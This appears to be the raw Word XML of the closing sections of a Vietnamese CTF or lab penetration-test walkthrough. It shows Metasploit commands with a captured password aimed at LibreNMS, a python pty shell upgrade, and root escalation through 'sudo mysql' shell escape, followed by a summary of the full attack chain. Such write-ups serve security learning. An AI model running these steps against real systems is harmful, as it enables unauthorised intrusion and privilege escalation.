    <w:p w14:paraId="143A31F2" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set PASSWORD sergioteamo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179AD088" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set LHOST eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293EAD0D" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648195AD" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sessions -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A57F266" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sessions -i 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFB2A1D" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Module được trỏ tới LibreNMS qua tunnel và sử dụng thông tin đăng nhập aeolus để tạo session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41442A4F" w14:textId="77777777" w:rsidR="00E92EA2" w:rsidRDefault="00E92EA2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32CEB25B" wp14:editId="299DAEC6">
            <wp:extent cx="6217920" cy="4067175"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="145759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9396" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4067175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CE9DA7" w14:textId="5CF4C6BF" w:rsidR="00E92EA2" w:rsidRPr="00E92EA2" w:rsidRDefault="00E92EA2" w:rsidP="00E92EA2">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="35797204" wp14:editId="2EC8C449">
            <wp:extent cx="6217920" cy="1693545"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1722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962" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1693545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54970F08" w14:textId="5721A858" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>9. Ổn định shell và leo quyền qua MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42289327" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tạo terminal tương tác và mở shell bằng quyền sudo của mysql.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A21291" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AEFE85" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python -c 'import pty; pty.spawn("/bin/bash")'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596716D9" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sudo mysql -e '\!  /bin/sh'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E45733" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Python tạo PTY. Lệnh mysql sử dụng chức năng gọi shell; khi mysql được chạy bằng sudo, shell sinh ra có quyền cao.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CC19E8" w14:textId="019FD958" w:rsidR="00B960E3" w:rsidRDefault="00E92EA2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C61C0C2" wp14:editId="767650A6">
            <wp:extent cx="6217920" cy="2797175"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="6438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7059" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2797175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0A8C29" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Quá trình thực hiện gồm khai thác tính năng sao chép tệp của FTP, lấy dữ liệu xác thực qua SMB, truy cập LibreNMS nội bộ và lợi dụng quyền sudo của MySQL để đạt quyền root.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00B960E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3C4550"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E0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430665">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="272174317">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="36514850">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="532380271">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1885407509">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1796169899">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="19015121">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="2105495147">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="2131507456">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1850555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599"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00335925"/>
    <w:rsid w:val="0035454E"/>
    <w:rsid w:val="004861B8"/>
    <w:rsid w:val="00864291"/>
    <w:rsid w:val="0088544F"/>
    <w:rsid w:val="00A94708"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B831E7"/>
    <w:rsid w:val="00B960E3"/>
    <w:rsid w:val="00C16E4C"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E122D8"/>
    <w:rsid w:val="00E92EA2"/>
    <w:rsid w:val="00F56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C8C20"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{F8AEE447-CC7A-4B13-B217-A502625A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D8"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00E12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127.0.0.1:8080/"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4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-27T09:29:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>